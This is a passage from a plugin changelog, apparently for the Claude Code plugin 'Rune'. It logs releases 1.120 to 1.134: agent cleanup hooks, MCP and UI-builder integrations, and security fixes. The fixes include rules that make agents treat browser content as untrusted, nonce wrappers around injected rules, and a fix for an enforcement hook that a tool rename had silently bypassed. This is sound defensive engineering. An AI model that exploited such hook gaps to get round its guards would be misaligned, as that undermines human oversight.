- **Variable hygiene** — Added `unset _prev_nullglob` after nullglob restore in `enforce-team-lifecycle.sh`.

## [1.134.1] - 2026-03-05

### Fixed
- **zsh-compat skill preprocessor collision** — Replaced backtick-quoted `!` patterns (`` `!` ``) with double-quoted or descriptive text to prevent Claude Code's `` !`command` `` preprocessor from misinterpreting them as shell directives. Fixes "not enough arguments" error on skill load.

## [1.134.0] - 2026-03-04

### Added
- **Design-sync accuracy parity with frontend-figma-sync** — Ported 6 high-accuracy patterns from custom per-project workflow to reusable plugin skill: visual-first protocol, worker trust hierarchy (6-level source priority), cross-verification gate (PASS/WARN/BLOCK with configurable thresholds), element inventory template, backend impact assessment (4-branch decision tree), and phase 2 design implementation guidance.
- **Configurable match confidence thresholds** — `design_sync.trust_hierarchy.low_confidence_threshold` in talisman.yml now fully propagated to worker prompts and SKILL.md scoring logic.
- **Verification gate reference docs** — New `verification-gate.md` with full algorithm, helper function signatures, and 9 fixture-based unit test scenarios.
- **Multi-URL design extraction** — Arc Phase 3 supports multiple Figma URLs with per-URL worker spawning, component cap enforcement, and cached VSM file lists.

### Fixed
- **Division by zero in verification gate** — Added zero guard for empty VSM regions (0 regions = 0% mismatch = PASS).
- **checkpointErrors used before declaration** — Moved array declaration before Step 13.5 verification gate in arc-phase-design-extraction.md.
- **PRO tier gate missing** — Template capability check now requires `builderProfile.accessTier === 'pro'`. OAuth access detection docs updated for consistency.
- **Visual-first protocol DRY violation** — Agent file now references canonical `visual-first-protocol.md` instead of duplicating inline.
- **Trust hierarchy reference guard** — Worker prompt injection now validates file existence before injecting Step 4.7.5.
- **Redundant filesystem scans** — Cached VSM file list between Step 13 (cap enforcement) and Step 15 (result collection) in arc-phase-design-extraction.md.
- **Example secret placeholders** — Replaced `"your-api-key-here"` with `"<your-token-here>"` across untitledui-mcp docs.

## [1.133.1] - 2026-03-04

### Fixed
- **Mend Phase 7 cleanup: wave-based fixer name coverage** — Phase 7 cleanup fallback now uses `spawnedFixerNames` from Phase 3 (which includes wave-based names like `mend-fixer-w1-1`, `mend-fixer-w2-3`) instead of base inscription names (`mend-fixer-1`, `mend-fixer-2`). Prevents zombie fixers when `config.json` dynamic discovery fails during wave-based execution (6+ file groups).
- **Strive Phase 6 cleanup: wave-based worker name coverage** — Added `spawnedWorkerNames` tracking in `wave-execution.md` for the same wave-naming gap as mend. Workers named `rune-smith-w{wave}-{idx}` are now tracked for Phase 6 cleanup fallback.
- **QUAL-012 naming compliance (codebase-wide)** — Renamed `cleanupSucceeded` → `cleanupTeamDeleteSucceeded` in 7 files: both copies of `team-lifecycle-guard.md` (rune-orchestration + roundtable-circle), `forge-cleanup.md`, `orchestration-phases.md`, `verdict-synthesis.md`, `goldmask/SKILL.md`, and `mend/SKILL.md`.
- **Missing final `TeamDelete()` in filesystem fallback (codebase-wide)** — Added `try { TeamDelete() } catch (e) {}` after `rm -rf` in all affected cleanup patterns. Clears SDK leadership state after filesystem cleanup, preventing "Already leading team" errors on next `TeamCreate`.
- **Cancel commands: ungated filesystem fallback** — All 4 cancel commands (`cancel-review`, `cancel-audit`, `cancel-arc`, `cancel-codex-review`) executed `rm -rf` unconditionally after the TeamDelete retry loop. Now gated behind `cleanupTeamDeleteSucceeded` flag per QUAL-012.
- **arc-phase-storybook-verification.md** — Missing final `TeamDelete()` after filesystem fallback rm-rf.

## [1.133.0] - 2026-03-04

### Added
- **UI Builder Protocol** — Pluggable abstraction layer for component library MCPs (UntitledUI, shadcn/ui, custom). Extends `integrations.mcp_tools` with `builder-protocol` SKILL.md frontmatter to declare capabilities (`search`, `list`, `details`, `bundle`, `templates`, `template_files`) and conventions reference path. Enables `discoverUIBuilder()` auto-detection, plan frontmatter `ui_builder` section, Phase 1.5 Component Match in design-sync, and `DSYS-BLD-*` compliance reviewer findings. Zero-cost when no builder is detected — pipeline unchanged.
- **`docs/guides/ui-builder-protocol.en.md`** — Developer guide covering: What is the UI Builder Protocol, Creating a Builder Skill (minimal example), Builder Frontmatter Contract (full schema), Capability Interface Reference (6 capabilities), Conventions File Format (size constraints, structure), Testing Your Builder Integration (6 steps), Examples (UntitledUI built-in, shadcn/ui, custom), Troubleshooting, Upgrading from MCP Integration Level 2.

### Changed
- **README.md** — Added UI Builder Protocol to MCP Tool Integrations section.
- **design-sync SKILL.md** — Phase 1.5 Component Match: `figma_to_react()` reference code is analyzed for component intent and used as search queries against the builder library MCP, producing an annotated VSM with real components instead of reference approximations.
- **design-system-discovery SKILL.md** — `discoverUIBuilder()` algorithm (5-step priority cascade: talisman binding → project skill frontmatter → plugin skill frontmatter → known MCP registry → heuristic) documented with `builder-protocol` frontmatter contract.
- **mcp-integration-spec.en.md** — Added builder workflow block for MCP-integrated pipelines (`figma_to_react → analyze intent → search_components → get_component → compose`).

## [1.132.0] - 2026-03-04

### Added
- **UntitledUI official MCP integration** — New `untitledui-mcp` skill providing built-in support for the official UntitledUI MCP server (6 tools: `search_components`, `list_components`, `get_component`, `get_component_bundle`, `get_page_templates`, `get_page_template_files`). Includes `builder-protocol` frontmatter for auto-discovery, complete code conventions (React Aria `Aria*` prefix, Tailwind v4.1 semantic colors, kebab-case files, `data-icon` attribute, compound components), and talisman configuration template. Non-invocable — auto-loaded by `design-system-discovery` when UntitledUI is detected. Supports free + PRO tiers with graceful fallback.
- **Builder Protocol metadata** — Skills can declare `builder-protocol:` in YAML frontmatter with `library`, `mcp_server`, `capabilities` (search/list/details/bundle/templates), and `conventions` reference path. Enables `discoverUIBuilder()` auto-detection.

### Changed
- **talisman.example.yml** — Updated MCP integrations example from custom tool names (`untitledui_find`, `untitledui_get`, etc.) to official UntitledUI MCP tool names (`search_components`, `get_component`, etc.). Updated `skill_binding` from `untitledui-builder` to `untitledui-mcp` (built-in). Added setup instructions with `claude mcp add` commands.
- **mcp-integration-spec.en.md** — Updated Level 1 server config to HTTP transport with official endpoint. Updated all tool name references to official names. Updated companion skill section to reference built-in `untitledui-mcp` Rune skill. Moved from `plugins/rune/docs/guides/` to repo root `docs/guides/`.
- **talisman SKILL.md** — Updated status output example from `untitledui-builder` to `untitledui-mcp`.

## [1.131.1] - 2026-03-04

### Removed
- Specialist reviewer agents (python-reviewer, typescript-reviewer, etc.) are no longer
  registered in the Claude Code agent registry. They are invoked exclusively through
  `/rune:appraise` via stack detection. If you have custom Ashes in talisman.yml referencing
  specialist agent names (e.g., `agent: "python-reviewer"`), replace with
  `agent: "general-purpose"` and add the specialist name to your custom Ash's prompt field.

## [1.131.0] - 2026-03-03

### Added
- **MCP Integration Framework** — Declarative `integrations.mcp_tools` talisman section for routing third-party MCP tools into Rune workflow phases. Triple-gated activation (config exists + phase match + trigger match). 3 integration levels (Basic, Talisman, Full). 4 resolver functions (`resolveMCPIntegrations`, `evaluateTriggers`, `buildMCPContextBlock`, `loadMCPSkillBindings`). Integrated into strive (Phase 1.5), devise (Phase 0), and forge (Phase 1.6). 6 tool categories, 6 workflow phases. Talisman audit validation for integrations. Developer guide at `docs/guides/mcp-integration-spec.en.md`.
- **MCP resolver security hardening** — SEC-001: Path traversal validation for rule files (reject `..` and absolute paths). SEC-002: Nonce-bounded Truthbinding wrapper for injected rule content. SEC-003: Namespace format validation. SEC-004: Tool name/category allowlist enforcement at resolution time. Rule count cap (max 5 per integration). Line-boundary-aware truncation.

### Changed
- **Talisman shard extraction** — Added `integrations` to `misc` shard in `talisman-resolve.sh` for shard-optimized config reads.
- **CLAUDE.md** — Added `resolveMCPIntegrations()` to Core Pseudo-Functions section.
- **configuration-guide.md** — Added full `integrations.mcp_tools` schema reference (16 keys).
- **talisman-sections.md** — Added row 27 for `integrations` section.
- **README.md** — Added MCP Tool Integrations section with feature overview.

## [1.130.0] - 2026-03-03

### Added
- **Standalone `/rune:brainstorm` skill** — Collaborative idea exploration with 3 modes: Solo (conversation, no agents), Roundtable (3 advisor agents: User Advocate, Tech Realist, Devil's Advocate), Deep (advisors + elicitation sages). Persistent output in `docs/brainstorms/` survives `/rune:rest`. 7-dimension quality gate scores brainstorm readiness for planning handoff.
- **Brainstorm workspace** — Full context chain preserved at `tmp/brainstorm-{timestamp}/` (advisor observations, codebase research, round history, elicitation outputs) for rich `/rune:devise` starting context.
- **`/rune:brainstorm` beginner alias command** — Thin wrapper routing to `/rune:brainstorm`.
- **Tarnished routing for brainstorm** — Fast-path keywords (`brainstorm`, `explore`), Vietnamese keywords (`kham pha`, `thao luan`), exploratory intent classification, brainstorm-then-plan and brainstorm-then-arc workflow chains.
- **Devise `--brainstorm-context PATH` flag** — Skip Phase 0, read existing brainstorm workspace for rich research context with quality-score-based confidence level.

### Changed
- **Devise Phase 0 delegates to brainstorm protocol** — `brainstorm-phase.md` replaced with thin delegation wrapper (~99 lines, from 474). Brainstorm skill is now the single source of truth for brainstorm logic. Three Phase 0 paths: `--brainstorm-context` (read workspace), `--quick` (skip), default (delegate to brainstorm protocol with devise-specific overrides).

## [1.129.2] - 2026-03-03

### Fixed
- **Arc-hierarchy stop hook parity with batch/issues** — Fixed 4 gaps in `arc-hierarchy-stop-hook.sh` to achieve parity with `arc-batch-stop-hook.sh` and `arc-issues-stop-hook.sh`. Ensures consistent behavior across all stop hook loop drivers.

### Removed
- **Custom RTK hook (`enforce-rtk.sh`)** — Replaced Rune's custom RTK Bash rewriter with the official `rtk-rewrite.sh` hook from [rtk-ai/rtk](https://github.com/rtk-ai/rtk). The official hook provides smarter command-specific rewriting (30+ commands with dedicated transforms like `cat` → `rtk read`, `grep` → `rtk grep`) vs Rune's blanket `rtk --` prefix approach. Removed: `enforce-rtk.sh`, `lib/rtk-config.sh`, `lib/rtk-exempt.sh`, RTK entry from `hooks.json`, `rtk:` section from talisman defaults/example/resolver/config guide. Users should run `rtk init -g --auto-patch` to install the official hook globally.

## [1.129.0] - 2026-03-02

### Added
- **Optional RTK Integration (`enforce-rtk.sh`)** — New optional PreToolUse:Bash hook that rewrites Bash commands with an `rtk` prefix for token compression when RTK (Rust Token Killer) is installed. Disabled by default — opt-in via `rtk.enabled: true` in talisman. Zero impact when disabled or RTK binary is not installed. Factored into sourced libraries (`lib/rtk-config.sh`, `lib/rtk-exempt.sh`) for maintainability.
- **Two-layer exemption system** — Layer 2 (command-level): configurable `exempt_commands` regex patterns checked first. Layer 1 (workflow-level): configurable `exempt_workflows` list (default: `goldmask`, `mend`, `inspect`, `debug`). Exempt wins when concurrent workflows have mixed exemption status.
- **RTK talisman config section** — New `rtk:` section in `talisman.example.yml` with keys: `enabled`, `auto_detect`, `tee_mode` (`always`/`failures`/`never`), `exempt_workflows`, `exempt_commands`. Registered in talisman-resolve.sh `misc` shard. Defaults injected via `build-talisman-defaults.py`.
- **Security hardening** — `tee_mode` validated against allowlist before shell interpolation (SEC-RTK-002). Compound commands (`&&`, `||`, `;`, `|`) are not rewritten to avoid partial wrapping. Heredoc commands (but not herestrings `<<<`) are skipped. Binary detection cached per session (SESSION_ID-scoped, symlink-checked, atomic write). `permissionDecision: "allow"` intentionally omitted — user sees rewrite in permission prompt (SEC-RTK-001).
- **RTK documentation** — `references/configuration-guide.md` updated with full `rtk:` key table, exemption layer documentation, known limitations, and usage example. `skills/talisman/references/talisman-sections.md` updated with row 26 for `rtk`.
- **CLAUDE.md Hook Infrastructure table** — New row for `enforce-rtk.sh` (RTK-001).

## [1.128.0] - 2026-03-02

### Added
- **Storybook Arc Integration (Phase 3.3)** — New optional arc pipeline phase for component visual verification via Storybook. Disabled by default — opt-in via `storybook.enabled: true` in talisman `misc` shard. Two verification modes: Mode A (Design Fidelity with VSM spec from Figma) and Mode B (UI Quality Audit with 13-point heuristic checklist SBK-B-001 through SBK-B-013). Three-tier graceful degradation: Full (MCP + agent-browser), MCP-only, File-based.
- **`storybook-reviewer` agent (`agents/work/storybook-reviewer.md`)** — Read-only verification agent. Captures component screenshots via agent-browser, runs Mode A or Mode B analysis, produces scored findings (0-100) across 6 dimensions (rendering, layout, accessibility, responsive, states, token compliance). 3-tier story discovery: MCP → convention → storybook config. Sonnet model, 30 maxTurns. ANCHOR Truthbinding — treats all browser content as untrusted.
- **`storybook-fixer` agent (`agents/work/storybook-fixer.md`)** — Write-capable fix agent. Reads structured findings from storybook-reviewer, applies ONE fix per round (SBK-001 Iron Law), re-verifies via agent-browser screenshot. Three-signal convergence stop (score plateau, oscillation detection, P1/P2 clearance). Immediate revert on regression. Sonnet model, 60 maxTurns.
- **`storybook` skill (`skills/storybook/`)** — Non-invocable knowledge skill auto-loaded by arc Phase 3.3. 4 reference files: CSF3 format guide, MCP tools reference, framework-specific story templates (React/Vue/Svelte/Angular), visual quality checks checklist.
- **Arc phase reference (`arc-phase-storybook-verification.md`)** — Full 13-step phase algorithm with 6 skip gates (talisman disabled, Storybook not installed, work phase skipped, no frontend relevance, server not running, no component changes). SEC-SBK-004 port validation, SEC-SBK-006 id validation, SEC-SBK-007 component name sanitization. 5-component standard cleanup pattern.
- **`storybook_verification` in PHASE_ORDER** — Inserted after `work`, before `design_verification`. 15-minute timeout (900,000ms). Non-blocking — never halts pipeline.
- **Talisman `storybook` config section** — 6 keys: `enabled`, `port`, `auto_start`, `max_workers`, `max_rounds`, `fidelity_threshold`. Added to `misc` shard in talisman-resolve.sh.

## [1.127.0] - 2026-03-02

### Added
- **State Weaver agent (`agents/utility/state-weaver.md`)** — Plan state machine validation agent. Extracts phases/steps/stages from plan documents, builds directed transition graphs, validates completeness via 10 structural checks (STSM-001 through STSM-010: dead-end states, unreachable states, missing error paths, orphaned artifacts, unconsumed inputs, unnamed state gaps, missing terminal states, loop-without-exit, ambiguous transitions, backward dependencies), verifies I/O contracts, and generates mermaid `stateDiagram-v2` diagrams. Trigger gate requires >= 3 phase indicators before full analysis. Uses STSM-NNN finding prefix (plan-level, not fed to runebinder). PASS/CONCERN/BLOCK verdict system consistent with other Phase 4C reviewers.
- **State Weaver integration into `/rune:devise` Phase 4C** — Conditional reviewer spawned alongside decree-arbiter, knowledge-keeper, and evidence-verifier during plan technical review. Gated by `talisman.yml` → `gates.state_weaver.enabled` (default: true).
- **State Weaver integration into `/rune:arc` Phase 2 (Plan Review)** — Added to arc reviewer roster as conditional entry, pushed after evidence-verifier. Validates enriched plan state machine before work phase begins.
- **State Weaver in Forge Gaze topic registry** — Topics: `state-machine, phases, transitions, pipeline, workflow, lifecycle, contracts, dataflow, input, output, steps, stages, dead-end, unreachable`. Subsection: "State Machine Analysis". Participates in topic-aware enrichment for phase-heavy plans.
- **State Weaver in devise cleanup fallback array** — Ensures cleanup covers the new reviewer even when dynamic member discovery fails.

## [1.126.0] - 2026-03-01

### Added
- **Standalone browser E2E testing (`/rune:test-browser`)** — New user-invocable skill that runs agent-browser tests against changed routes without spawning an agent team. 9-step inline workflow: installation guard → scope detection → route discovery → mode selection → server verification → per-route test loop → human gate → failure handling → summary report.
- **`resolveTestScope()` shared algorithm** (`testing/references/scope-detection.md`) — PR-based scope detection with 3 input modes: PR number (via `gh pr view`), branch name (git diff), or current HEAD. Includes empty-files guard (Gap G-1), base-case git-repo guard (Gap 2.1), and default branch detection (3-strategy fallback). Shared between `/rune:test-browser` and arc Phase 7.7 TEST.
- **Human verification gates** (`skills/test-browser/references/human-gates.md`) — 5 gate pattern registry (OAuth/SSO, Payment, Email verification, SMS/2FA, External API). Standalone mode: AskUserQuestion pause with Yes/Skip/Abort options. Arc mode: auto-skip with PARTIAL status. Detection via URL patterns + snapshot content matching.
- **Interactive failure handling** (`skills/test-browser/references/failure-handling.md`) — 3-option recovery for E2E failures: Fix Now (reads source files, applies inline fix, re-tests with concrete pass criteria: console errors == 0 AND snapshot.length > 50), Create Todo (schema v2 file-todo compatible with `/rune:file-todos`), Skip. Implements `mapRouteToSourceFiles()` using framework-specific detection from `file-route-mapping.md`.
- **Snapshot verification** (`testing/references/service-startup.md`) — `verifyServerWithSnapshot()` opens a page in throwaway session, takes a snapshot, checks for blank/error/loading states before E2E testing begins. Standalone mode: abort with framework-specific start instructions. Arc mode: advisory WARN and proceed.
- **Arc Phase 7.7 PR scope upgrade** (`arc/references/arc-phase-test.md`) — Phase 7.7 TEST now calls `resolveTestScope()` from shared scope-detection.md, enabling diff-scoped testing based on arc plan PR reference.
- **e2e-browser-tester agent `standalone` flag** — Agent YAML frontmatter now accepts `standalone` parameter to distinguish interactive (test-browser) from pipeline (arc Phase 7.7) execution context.
- **agent-browser v0.15.x documentation** — Domain allowlist (`AGENT_BROWSER_ALLOWED_DOMAINS`), content boundaries (`AGENT_BROWSER_CONTENT_BOUNDARIES`), and auth vault (`agent-browser auth save/login`) coverage added to `agent-browser` skill.
- **CREATION-LOG.md** for `test-browser` skill documenting key design decisions: ISOLATION CONTRACT rationale, E2E-only scope, AskUserQuestion timeout limitation, concrete pass criteria, `mapRouteToSourceFiles` gap fixes.

## [1.125.2] - 2026-03-01

### Fixed
- **`local` outside function crashes arc phase stop hook** — `local _saved_nullglob=...` on line 437 of `arc-phase-stop-hook.sh` was outside any function body. In bash 3.2 (macOS `/bin/bash`), `local` is only valid inside functions. This triggered `trap 'exit 0' ERR`, causing the hook to silently exit after incrementing the iteration counter but before outputting the blocking JSON that re-injects the next phase prompt. Result: arc phases stopped after every single phase, breaking `/rune:arc` and `/rune:arc-batch`. Introduced by PR #180 (v1.124.0 zombie team verification feature).
- **Same `local` outside function bug in `session-team-hygiene.sh`** — Lines 125 and 132 used `local` in the main script body. Fixed to plain variable assignment.

## [1.125.1] - 2026-03-01

### Fixed
- **Premature staleness threshold in `on-session-stop.sh`** — Arc phase loop state files were deleted after 10 minutes, but arc phases routinely take 10-50 minutes (work=35m, test+E2E=50m). This broke the Stop hook phase-loop pattern, causing arc pipelines to stall after completing a single phase. Increased phase loop threshold to 90 minutes and outer loop thresholds (batch/hierarchy/issues) to 150 minutes. All thresholds now use named constants for maintainability.
- **Premature staleness threshold in `detect-workflow-complete.sh`** — GUARD 2 loop file staleness used 30 minutes, which was insufficient for work (35m) and test+E2E (50m) phases. Increased to 150 minutes to match `on-session-stop.sh` thresholds and prevent the hook from treating active workflows as orphaned.

## [1.125.0] - 2026-03-01

### Added
- **Session Self-Learning (`/rune:learn`)** — New user-invocable skill that extracts CLI correction patterns and review recurrence findings from session history and persists them as Rune Echoes memory entries
- **`session-scanner.sh`** — Scans Claude Code session JSONL files, extracts tool_use + tool_result event pairs using two-pass join architecture. Includes mtime-based session exclusion (60s), `isCompactSummary` filtering, 500-char content truncation, and `find -P` symlink protection
- **`cli-correction-detector.sh`** — Detects error→success sequences within a sliding window (default: 5). Classifies 7 error types (UnknownFlag, CommandNotFound, WrongPath, WrongSyntax, PermissionDenied, Timeout, UnknownError fallback), scores confidence (base 0.5 + same-tool/similar-args/multi-session bonuses), deduplicates with Jaccard word-overlap
- **`review-recurrence-detector.sh`** — Cross-references TOME findings across `tmp/reviews/`, `tmp/audit/`, `tmp/arc/` to detect recurring findings not yet in echoes. Severity inference by prefix (SEC→high, BACK/VEIL→medium, QUAL→low)
- **`echo-writer.sh`** — Writes detected patterns to `.claude/echoes/{role}/MEMORY.md` with symlink guard, role validation, mkdir-based portable locking, 150-line pre-flight warning, Jaccard dedup (80% threshold), and echo-search dirty signal
- **`sensitive-patterns.sh`** library — Reusable 16-pattern sensitive data filter (API keys, JWTs, connection strings, PEM keys). Exports `rune_strip_sensitive()` function compatible with bash 3.2+
- **`/rune:learn` skill** (`skills/learn/SKILL.md`) — 4-phase execution: parse args → run detectors → consolidate report → user confirmation + write. Supports `--since`, `--detector`, `--dry-run` flags
- **Detector reference** (`skills/learn/references/detectors.md`) — Algorithm documentation, JSONL schema, confidence scoring, and output schemas for all detectors
- **Talisman `learn:` config block** — Optional per-project learning configuration (min_confidence, detectors, roles)

## [1.124.0] - 2026-03-01

### Added
- **Hook-driven deterministic post-workflow teammate cleanup** (`detect-workflow-complete.sh`) — Layer 5 defense that fires on every Stop event, detects completed workflows with uncleaned teams, and executes 2-stage process escalation (SIGTERM -> SIGKILL) with filesystem cleanup
- **Talisman cleanup configuration** (`teammate_lifecycle.cleanup`) — configurable `enabled`, `grace_period_seconds`, and `escalation_timeout_seconds` settings in talisman-defaults.json and talisman.example.yml
- **Auto-clean PID-dead orphan teams on SessionStart** — `session-team-hygiene.sh` now removes teams whose owner PID is provably dead, without waiting for the 30-minute orphan threshold
- **Process kill for orphan teammates on session resume** — `session-team-hygiene.sh` sends SIGTERM to child processes of dead owner PIDs found in active state files
- **Arc phase stop hook zombie team verification** — `arc-phase-stop-hook.sh` checks if the prior phase's team dir still exists before starting next phase, cleaning zombie teams left by context exhaustion
- **CDX-7 session marker check in arc preflight** — `arc-preflight.md` now checks `.session` marker files and PID liveness before cleaning foreign teams during stale arc team scan
- **`RUNE_CLEANUP_DRY_RUN=1` dry-run mode** for cleanup scripts — all cleanup hooks (`detect-workflow-complete.sh`, `on-session-stop.sh`, `session-team-hygiene.sh`) log what they would do without actually killing processes, deleting teams, or modifying state files

### Fixed
- **State file coverage gap in `on-session-stop.sh` Phase 2** — replaced 8 explicit `.rune-*-*.json` patterns with universal `.rune-*.json` glob, covering 4+ previously missing workflow types (codex-review, goldmask, batch, test). Added skip guard for signal files handled by dedicated cleanup blocks.

### Changed
- **CLAUDE.md Layer 5 defense documentation** — updated from 4-layer to 5-layer defense model, added `detect-workflow-complete.sh` to Hook Infrastructure table, documented `RUNE_CLEANUP_DRY_RUN` env var

## [1.123.0] - 2026-03-01

### Added
- **Research Output Verification Layer (Phase 1C.5)**: New verification phase in `/rune:devise` pipeline that validates external research outputs for relevance, accuracy, freshness, cross-validation, and security before plan synthesis
- New `research-verifier` utility agent with 5-dimension trust scoring and ANCHOR/RE-ANCHOR truthbinding
- Talisman config `plan.research_verification` section with per-dimension toggles, safe domain allowlist, and trust threshold
- Inscription schema `verification.research_verification` field for verification state tracking (findings count by verdict, aggregate score, version mismatches)
- `--no-verify-research` CLI flag for `/rune:devise` to skip research verification

## [1.122.1] - 2026-03-01

### Fixed
- **Evidence-verifier false positive on `version_target`** — evidence-verifier was treating YAML frontmatter planning metadata (`version_target`, `estimated_effort`, `complexity`, `impact`, `risk`, `date`) as factual codebase claims and verifying them against current state. This caused spurious BLOCK verdicts in arc-batch when a previous plan bumped the plugin version, making subsequent plans' `version_target` appear "stale". Added Non-Factual Field Exemptions section to exempt intent/estimate fields from claim verification.

## [1.122.0] - 2026-03-01

### Added
- Worktree Lifecycle Guard: crash-safe cleanup for orphaned `rune-work-*` worktrees
  - `scripts/lib/worktree-gc.sh`: shared GC library with PID liveness checks, jq guard, path traversal protection
  - Stop hook (`on-session-stop.sh`): AUTO-CLEAN PHASE 4 removes orphaned worktrees on session exit (3-worktree cap for timeout budget)
  - SessionStart hook (`session-team-hygiene.sh`): detects orphaned worktrees and reports count
  - `/rune:rest`: expanded worktree cleanup (strive `rune-work-*` in addition to mend `bisect-worktree`)
  - `git-worktree/SKILL.md`: Safety Net documentation section

## [1.121.0] - 2026-03-01

### Fixed
- **SEC-101**: Path traversal in checkpoint path construction — replaced `${outputDir}../checkpoint.json`
  with explicit path segment splitting in `orchestration-phases.md`
- **QUAL-010**: Property name mismatch `sessionNonce` → `session_nonce` in orchestration phases,
  consolidated double state-file write into single write
- **VEIL-001**: Nonce regex guard text alignment with actual `{8}` pattern, added source validation
  check (`VALID_SOURCES`) in `todo-generation.md`
- **VEIL-006**: Unanchored regex for todo ID extraction — anchored with `^` and `split('/').pop()`
  to prevent false matches from directory names in `todo-generation.md`
- **SEC-102**: NaN guard for TOME timestamp filter parsing via `parseInt(..., 10)` + `Number.isNaN()`,
  added 3-step `reviewTodosBase` resolution (QUAL-007 pattern) in `arc-phase-code-review.md`
- **VEIL-004**: Corrected misleading comment ("Sort by modification time" → "Sort by name descending"),
  added BACK-005 (current arc checkpoint filtering) and BACK-006 (explicit dirname extraction)
  in `arc-phase-mend.md`
- Defensive null guard for `checkpoint.todos_base` in `arc-phase-work.md`
- Resilient session context filter in `subcommands.md` (`s.todos_base || s.id`)

## [1.120.4] - 2026-02-28

### Fixed
- **Task→Agent rename straggler in design-sync** — `design-sync/SKILL.md` had 4 remaining `Task(`
  pseudocode instances missed by PR #172 (v1.120.2). Renamed to `Agent(` for Claude Code 2.1.63
  compatibility.
- **devise Phase 6 fallback shutdown array gap** — `devise/SKILL.md` Phase 6 cleanup had an
  empty fallback `allMembers = []` when dynamic member discovery failed. This meant zero agents
  would receive `shutdown_request` if team config was unreadable — causing zombie teammates that
  block `TeamDelete`. Added fallback array with all known plan-review agents (scroll-reviewer,
  decree-arbiter, knowledge-keeper, veil-piercer-plan, horizon-sage, evidence-verifier,
  doubt-seer, codex-plan-reviewer). Also added cleanup note to `plan-review.md` clarifying that
  Phase 4 reviewers share the devise team — cleanup belongs at Phase 6, not Phase 4C.
- **arc plan-review fallback shutdown array gap** — `arc-phase-plan-review.md` cleanup fallback
  array was missing `veil-piercer-plan` (always spawned, core 4) and `codex-plan-reviewer`
  (conditionally spawned). If dynamic member discovery failed, these agents would not receive
  `shutdown_request` — causing zombie teammates that block `TeamDelete`.
- **codex-review cleanup gap (HIGH)** — `codex-review/SKILL.md` had bare `TeamDelete()` with no
  `shutdown_request`, no grace period, no retry-with-backoff, no filesystem fallback. Added full
  standard cleanup: dynamic member discovery with fallback array (5 Claude + 4 Codex agents),
  shutdown_request loop, 15s grace period, 3-attempt retry-with-backoff, CHOME filesystem fallback.
- **Standardized TeamDelete retry-with-backoff across 6 arc phase files** — Upgraded single-attempt
  `TeamDelete()` to standard 3-attempt retry-with-backoff (0s, 5s, 10s) with filesystem fallback
  gated behind `!cleanupTeamDeleteSucceeded` in: `arc-phase-design-extraction.md`,
  `arc-phase-design-verification.md`, `arc-phase-design-iteration.md`, `arc-phase-test.md`,
  `gap-analysis.md` (STEP B.10), `gap-remediation.md` (STEP 9), `arc-phase-mend.md` (sage team).
- **appraise Phase 7 cleanup crash resilience** — `appraise/SKILL.md` Phase 7 dynamic member
  discovery had no `try/catch` around `Read(config.json)` — if the team config file was unreadable
  (race condition, permission error, partial write), the entire cleanup block would crash, leaving
  zombie teammates and orphaned team directories. Added `try/catch` with `Array.isArray()` guard,
  SEC-4 member name validation (`/^[a-zA-Z0-9_-]+$/`), and fallback array of all 8 built-in Ashes
  (forge-warden, ward-sentinel, pattern-weaver, veil-piercer, glyph-scribe, knowledge-keeper,
  codex-oracle, runebinder).
- **debug Phase 4 cleanup gap (HIGH)** — `debug/SKILL.md` Phase 4 had `shutdown_request` and grace
  period but was missing retry-with-backoff TeamDelete, filesystem fallback, and dynamic member
  discovery. Used hardcoded `investigator-{N}` loop with no fallback if team config was unreadable.
  Added full standard cleanup: dynamic member discovery with `config.json` read + SEC-4 validation,
  fallback to investigator index array, 3-attempt retry-with-backoff, CHOME filesystem fallback
  gated behind `!cleanupTeamDeleteSucceeded`.
- **design-sync Phase 4 cleanup gap (CRITICAL)** — `design-sync/SKILL.md` Phase 4 cleanup was
  entirely skeletal — comment placeholders with no actual cleanup logic. `shutdown_request` was a
  bare comment, no grace period, bare `TeamDelete()` with no retry, no filesystem fallback, no
  member discovery. Added full standard cleanup: dynamic member discovery with `config.json` read +
  SEC-4 validation, fallback array of all 8 known workers across 3 phases (design-syncer-1/2,
  rune-smith-1/2/3, design-iter-1/2, design-reviewer-1), shutdown_request loop, 15s grace period,
  3-attempt retry-with-backoff, CHOME filesystem fallback.

## [1.120.3] - 2026-02-28

### Fixed
- **_phase_ref() routing**: `test_coverage_critique` now correctly routes to `arc-phase-test.md` and `release_quality_check` routes to `arc-phase-pre-ship-validator.md` (were both incorrectly routing to `arc-codex-phases.md`)
- **Phase count references**: Updated stale "23 phases" references to "26 phases" across 15 locations in 7 files — 3 missing design phases (design_extraction, design_verification, design_iteration) added to phase lists
- **workflow-lock.sh config_dir fallback**: Hardened session isolation with proper `CLAUDE_CONFIG_DIR` fallback pattern
- **Duplicate GUARD numbering**: Renumbered duplicate GUARD 11 to GUARD 12 in `arc-hierarchy-stop-hook.sh` (context-critical check before arc prompt injection)

## [1.120.2] - 2026-02-28

### Fixed
- **Claude Code 2.1.63 compatibility: Task → Agent tool rename** — Claude Code 2.1.63 renamed
  the `Task` subagent-spawning tool to `Agent`. This broke all Rune hook matchers, enforcement
  scripts, and allowed-tools frontmatter that targeted the `Task` tool name. Changes:
  - **hooks.json**: Updated 4 hook matchers to `Task|Agent` for backward compatibility with both
    old (<2.1.63) and new (2.1.63+) Claude Code versions. Affected matchers: `enforce-teams.sh`,
    `advise-post-completion.sh`, `guard-context-critical.sh`, `rune-context-monitor.sh`.
  - **enforce-teams.sh** (ATE-1): Updated tool_name check from `!= "Task"` to dual check
    `!= "Task" && != "Agent"`. Updated error messages to reference `Agent` calls. Without this
    fix, ATE-1 enforcement was completely bypassed on 2.1.63+ — bare agent calls were silently
    allowed during active workflows.
  - **guard-context-critical.sh** (CTX-GUARD-001): Updated Explore/Plan exemption check from
    `== "Task"` to `== "Task" || == "Agent"`. Without this fix, the exemption was unreachable
    and all agent spawns (including safe read-only agents) were subject to context budget denial.
  - **enforce-readonly.sh**: Updated comment referencing Task tool.
  - **allowed-tools frontmatter**: Updated `- Task` to `- Agent` in 15 skill SKILL.md files
    (arc, audit, appraise, codex-review, context-weaving, debug, design-sync, devise, forge,
    goldmask, inspect, mend, roundtable-circle, rune-orchestration, strive). Without this fix,
    skills could not use the renamed Agent tool.
  - **Pseudocode/documentation**: Updated ~80+ `Task({` code examples to `Agent({` across 29
    reference and skill files. Updated prose references from "Task tool" to "Agent tool",
    "bare Task" to "bare Agent", "Task call" to "Agent call".
  - **Root CLAUDE.md**: Updated Team Lifecycle step 3 from "Task tool" to "Agent tool".
  - CHANGELOG.md historical entries intentionally preserved as-is.

## [1.120.1] - 2026-02-28

### Fixed
